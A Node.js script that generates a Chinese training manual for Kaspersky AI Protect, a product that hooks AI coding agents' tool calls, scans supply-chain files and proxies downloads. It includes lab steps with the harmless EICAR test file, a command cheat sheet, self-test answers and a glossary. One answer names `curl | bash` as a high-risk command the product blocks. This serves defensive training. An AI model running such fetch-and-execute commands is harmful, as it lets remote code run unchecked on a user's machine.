    ["在「供应链扫描」上传一个正常文件和一个 EICAR 压缩包；", "用 `curl` 加 `X-API-Key` 调用 `/api/v1/supply/upload` 上传同一个正常文件；", "在「隔离区」找到被隔离的文件并删除。"],
    "预期：正常文件 `action=allow`；EICAR 压缩包检出并隔离；第二次上传正常文件命中判定缓存。"),
  lab(7, "下载代理（可选）", "验证下载流量的 ICAP 扫描", "KSE 服务器（Ubuntu 22.04+）、Linux 终端",
    ["执行 `install-squid.sh`，在 KSE 控制台配置 ICAP Syslog；", "终端执行 `client-proxy.sh`；", "经代理下载正常网页与 `https://secure.eicar.org/eicar.com`；", "在平台事件日志中查看来源为 kse-syslog 的事件。"],
    "预期：正常网页 200，EICAR 403 显示 KSE 拦截页；平台出现带终端 IP、URL、SHA-256 的拦截事件。"),
);

// ===== 附录 =====
add(
  new Paragraph({ pageBreakBefore: true, children: [new TextRun({ text: "APPENDIX", font: BRANDF, size: 18, bold: true, color: GREEN, characterSpacing: 40 })] }),
  new Paragraph({ heading: HeadingLevel.HEADING_1, children: [new TextRun({ text: "附录 A  命令速查" })] }),
  ...table(["命令", "用途"], [
    ["`kaip status`", "平台连接、策略版本、接入的 Agent"],
    ["`kaip verify`", "各 Agent 防护是否真正生效（升级后必做）"],
    ["`kaip selftest`", "以各 Agent 的调用格式自测拦截"],
    ["`kaip test`", "EICAR 写入与高危命令拦截链路"],
    ["`kaip scan <路径>`", "手动扫描模型 / Skill / 文档目录"],
    ["`kaip sync`", "立即同步策略与客户端，触发完整性校验"],
    ["`kaip install` / `kaip uninstall [--purge]`", "接入 / 卸载"],
    ["`sudo bash install-offline.sh`", "平台离线安装与升级"],
    ["`deploy/kse-share.sh kaip-host | kse-host`", "分机部署 NFS 共享与挂载"],
    ["`docker compose up -d`（deploy/）", "Docker 方式启动平台"],
    ["`deploy/squid/install-squid.sh`", "安装下载代理"],
    ["`client-proxy.sh` / `client-proxy.ps1`", "终端接入 / 撤销下载代理"],
    ["`journalctl -u kaip-platform`", "平台日志"],
  ], [42, 58]),
  new Paragraph({ heading: HeadingLevel.HEADING_1, pageBreakBefore: true, children: [new TextRun({ text: "附录 B  自测题参考答案" })] }),
  H3("模块 1"),
  ...numbered([
    "杀毒在文件落盘或进程启动后介入，看不到 Agent 将要执行的命令与意图，也不覆盖 Skill、模型、RAG 等 AI 场景入口。",
    "AI Agent 运行时防护；AI 供应链入口扫描；自我保护与可运营。",
    "不能执行前拦截，KAIP 只拦截经 Agent 工具调用的操作；由目录监控（事后）与终端杀毒覆盖。",
  ]),
  H3("模块 2"),
  ...numbered([
    "≥25 MB，平台把文件写入扫描目录，KSE 经 NFS 只读挂载按路径（scanfile）扫描。",
    "`curl | bash` 命中 KAIP 规则，判定 RISK 并阻断；病毒文件需要 KSE 判定，KSE 不可用时为 ERROR，默认 fail_open 放行。",
    "自愈以平台上的官方客户端为准，终端侧的不同版本会被视为篡改并恢复。",
    "不会。隔离只针对 KSE 确认的 DETECT 与哈希黑名单。",
  ]),
  H3("模块 3"),
  ...numbered([
    "KSE 仍为默认的本地 socket 监听，未改为 TCP 127.0.0.1:1234（或 KSE 服务未运行）。",
    "在终端中运行一次 `codex`，在「Hooks need review」中信任 KAIP hook，再执行 `kaip verify`。",
    "不需要。在客户 compose 中加入 KAIP 配置片段；令牌写入 `kaip_enroll_token.txt`，以 compose secrets 文件挂载。",
    "可以。系统 Python 低于 3.10 时，脚本自动使用包内便携 Python 3.12。",
  ]),
  H3("模块 4"),
  ...numbered([
    "试运行用审计模式收集事件；误报用哈希白名单（单个文件）或受信任来源目录（整个官方来源）处理，然后改回阻断。",
    "执行 `sudo systemctl restart kaip-platform`（Docker 方式 `docker compose up -d`）。",
    "供应链 API Key（`X-API-Key`），调用 `POST /api/v1/supply/upload`，仅在返回 `action=allow` 时入库。",
  ]),
  H3("模块 5"),
  ...numbered([
    "KSE 不可用，处于防护空窗。先看控制台扫描引擎状态与 1234 端口是否监听，分机部署时检查 NFS 挂载。",
    "不需要。kaip-watch 在心跳中发现版本落后后自动升级。",
    "把该文件的 SHA-256 加入哈希白名单，避免再次被拦截。",
  ]),
  H3("模块 6"),
  ...numbered([
    "被防护篡改规则阻断，并产生 Tamper 事件；卸载需用户在终端手动执行。",
    "普通卸载保留 `~/.kaip`，适合临时停用或重装接入；`--purge` 删除全部本地数据，适合终端不再使用。",
  ]),
  H3("模块 7"),
  ...numbered([
    "`kaip verify` 是否生效 → WorkBuddy 是否从托盘完全退出后重开 → `kaip.log` 是否有判定记录 → 平台事件与 KSE 状态 → 确认模型是否自行拒绝执行。",
    "KSE 与 KSN 断开或重连期间 ICAP 扫描超时后原样放行；保证 KSN 网络稳定，隔离网络关闭 KSN，终端侧 KAIP 仍会在写入 / 执行时扫描。",
  ]),
  new Paragraph({ heading: HeadingLevel.HEADING_1, pageBreakBefore: true, children: [new TextRun({ text: "附录 C  术语表" })] }),
  ...table(["术语", "说明"], [
    ["AI Agent", "能调用工具（命令、文件、网络）的 AI 编程助手，如 Codex、WorkBuddy、OpenCode"],
    ["hook / 插件", "Agent 提供的扩展机制，KAIP 借此在工具调用前介入"],
    ["Skill", "Agent 可安装、调用的能力包，通常含脚本与说明文档"],
    ["KSE", "Kaspersky Scan Engine，卡巴斯基扫描引擎"],
    ["KSN", "Kaspersky Security Network，卡巴斯基云信誉网络"],
    ["ICAP", "互联网内容适配协议，代理服务器借此把内容交给扫描引擎"],
    ["scanmemory / scanfile", "KSE 的内存扫描与按路径扫描接口"],
    ["fail_open", "引擎不可用时放行的策略"],
    ["判定缓存", "按 SHA-256 复用扫描结果，病毒库更新后失效"],
    ["EICAR", "业界通用的无害病毒测试文件"],
    ["CEF", "Common Event Format，SIEM 通用事件格式"],
  ], [26, 74]),
);

// ---------- 封面 ----------
const coverBg = new ImageRun({
  type: "png", data: img("cover.png"), transformation: { width: 794, height: 1123 },
  floating: {
    horizontalPosition: { relative: HorizontalPositionRelativeFrom.PAGE, offset: 0 },
    verticalPosition: { relative: VerticalPositionRelativeFrom.PAGE, offset: 0 },
    behindDocument: true, allowOverlap: true, wrap: { type: TextWrappingType.NONE },
  },
  altText: { title: "封面", description: "封面底图", name: "cover" },
});
const W_ = (t, size, o = {}) => new TextRun({ text: t, font: o.font || BRANDF, size, bold: o.bold, color: o.color || "FFFFFF", characterSpacing: o.cs });
const cover = [
  new Paragraph({ children: [coverBg, W_("kaspersky", 40, { bold: true, color: GREEN })], spacing: { before: 400, after: 0 } }),
  new Paragraph({ children: [], spacing: { before: 2600 } }),
  new Paragraph({ children: [W_("PRODUCT TRAINING", 20, { bold: true, color: GREEN, cs: 60 })], spacing: { after: 160 } }),
  new Paragraph({ children: [W_("Kaspersky AI Protect", 64, { bold: true })], spacing: { after: 80, line: 680 } }),
  new Paragraph({ children: [W_("产品培训手册", 48, { bold: true })], spacing: { after: 360 } }),
  new Paragraph({ children: [W_("架构 · 安装 · 配置 · 运维 · 卸载 · 故障排查 · 实验", 22, { color: "C8D0CD" })], spacing: { after: 1400 } }),
  ...[["版本", VERSION], ["日期", DATE], ["适用版本", "KAIP 1.0.0 · Kaspersky Scan Engine 2.2"], ["编制", "卡巴斯基售前团队"]].map(([k, v]) =>
    new Paragraph({ children: [W_(`${k}　`, 19, { color: GREEN, bold: true }), W_(v, 19, { color: "E6ECEA" })], spacing: { after: 90 } })),
];

// ---------- 页眉页脚 ----------
const header = new Header({ children: [new Paragraph({
  tabStops: [{ type: TabStopType.RIGHT, position: W }],
  border: { bottom: { style: BorderStyle.SINGLE, size: 4, color: LINE, space: 6 } },
  children: [new TextRun({ text: "kaspersky", font: BRANDF, size: 20, bold: true, color: GREEN }),
    new TextRun({ text: "\tKaspersky AI Protect · 产品培训手册", font: BRANDF, size: 16, color: GRAY })],
})] });
const footer = new Footer({ children: [new Paragraph({
  tabStops: [{ type: TabStopType.RIGHT, position: W }],
  children: [new TextRun({ text: `KAIP 产品培训手册 ${VERSION}`, font: BRANDF, size: 16, color: GRAY }),
    new TextRun({ children: ["\t", PageNumber.CURRENT], font: BRANDF, size: 18, bold: true, color: GREEN })],
})] });

// ---------- 文档 ----------
const H = (id, name, size, color, before, after, level, extra = {}) => ({
  id, name, basedOn: "Normal", next: "Normal", quickFormat: true,
  run: { font: BRANDF, size, bold: true, color },
  paragraph: { spacing: { before, after }, keepNext: true, keepLines: true, outlineLevel: level, ...extra },
});
const doc = new Document({
  creator: "卡巴斯基售前团队",
  title: "Kaspersky AI Protect 产品培训手册",
  description: "KAIP 产品培训：架构、安装、配置、运维、卸载、故障排查与实验",
  styles: {
    default: { document: { run: { font: BODYF, size: 20, color: GRAPH } } },
    paragraphStyles: [
      H("Heading1", "Heading 1", 44, INK, 60, 120, 0),
      H("Heading2", "Heading 2", 28, INK, 320, 120, 1, { border: { left: { style: BorderStyle.SINGLE, size: 24, color: GREEN, space: 8 } }, indent: { left: 160 } }),
      H("Heading3", "Heading 3", 22, GREEN_D, 200, 80, 2),
      { id: "TOC1", name: "toc 1", basedOn: "Normal", next: "Normal", run: { font: BRANDF, size: 21, bold: true, color: INK },
        paragraph: { spacing: { before: 160, after: 30, line: 276 } } },
      { id: "TOC2", name: "toc 2", basedOn: "Normal", next: "Normal", run: { font: BODYF, size: 18, color: GRAPH },
        paragraph: { spacing: { before: 0, after: 0, line: 264 }, indent: { left: 360 } } },
    ],
  },
  numbering: {
    config: [
      { reference: "bul", levels: [
        { level: 0, format: LevelFormat.BULLET, text: "■", alignment: AlignmentType.LEFT, style: { run: { color: GREEN, size: 14 }, paragraph: { indent: { left: 440, hanging: 260 } } } },
        { level: 1, format: LevelFormat.BULLET, text: "–", alignment: AlignmentType.LEFT, style: { paragraph: { indent: { left: 860, hanging: 260 } } } }] },
      ...Array.from({ length: 80 }, (_, i) => ({ reference: `num${i + 1}`, levels: [{ level: 0, format: LevelFormat.DECIMAL, text: "%1", alignment: AlignmentType.LEFT,
        style: { run: { font: BRANDF, bold: true, color: GREEN }, paragraph: { indent: { left: 440, hanging: 320 } } } }] })),
    ],
  },
  sections: [
    { properties: { page: { size: { width: 11906, height: 16838 }, margin: { top: 1134, bottom: 0, left: 1134, right: 1134 } } },
      headers: { default: new Header({ children: [new Paragraph({ children: [] })] }) },
      footers: { default: new Footer({ children: [new Paragraph({ children: [] })] }) },
      children: cover },
    { properties: { page: { size: { width: 11906, height: 16838 }, margin: { top: 1300, bottom: 1100, left: 1134, right: 1134, header: 560, footer: 520 }, pageNumbers: { start: 1 } } },
      headers: { default: header }, footers: { default: footer }, children: body },
  ],
});

Packer.toBuffer(doc).then((buf) => {
  const out = process.argv[2] || path.join(__dirname, "KAIP_产品培训手册.docx");
  fs.writeFileSync(out, buf);
  console.log("已生成", out, (buf.length / 1024).toFixed(0) + " KB");
});
